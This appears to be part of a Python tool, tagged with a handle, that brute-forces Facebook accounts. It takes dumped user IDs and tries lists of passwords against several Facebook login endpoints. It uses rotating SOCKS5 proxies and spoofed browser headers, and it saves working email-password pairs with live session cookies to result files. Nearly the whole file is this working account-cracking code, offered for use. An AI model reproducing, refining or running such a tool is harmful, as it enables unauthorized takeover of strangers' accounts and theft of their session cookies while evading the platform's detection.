               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def regularAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "pass":pw,
                 "login":"Masuk",
                 "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "free.facebook.com",
                  "content-length": "177",
                  "cache-control": "max-age=0",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://free.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "x-requested-with": "mark.via.gp",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"Email : {user}\nPass : {pw}\n Cookies : {kuki}\n UserAgent : {ua}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"Email : {user}\nPass : {pw}\nUserAgent : {ua}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def asyncAPP(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent_APP()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2167",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=93f0b61b177d4c14afdb43cbde26a2e2&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"Email : {user}\nPass : {pw}\n Cookies : {kuki}\n UserAgent : {ua}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"Email : {user}\nPass : {pw}\nUserAgent : {ua}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def validateAPP(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().UserAgent_APP()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers = {'User-Agent':ua})
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "uid":user,
                 "next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                 "flow":"login_no_pin",
                 "pass":pw
               }
               headers = {
                  "Host": "mbasic.facebook.com",
                  "content-length": "746",
                  "cache-control": "max-age=0",
                  "dpr": "1.4375",
                  "viewport-width": "980",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "sec-ch-ua-platform": '"Android"',
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-prefers-color-scheme": "light",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://mbasic.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"Email : {user}\nPass : {pw}\n Cookies : {kuki}\n UserAgent : {ua}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"Email : {user}\nPass : {pw}\nUserAgent : {ua}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def regularAPP(self, user, password):
       Console().print(Markdown(f"## Error 404 Not Found"),style='yellow') ; sleep(3.1) ; sys.exit()

if __name__=='__main__':
  os.system('xdg-open https://chat.whatsapp.com/HZEZeQjUXb4Jz3GTVhoJK8')
  try:
      os.system("git pull") ; REQ().Menuuu()
  except requests.exceptions.ConnectionError as e:
      os.system("clear") ; Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit() 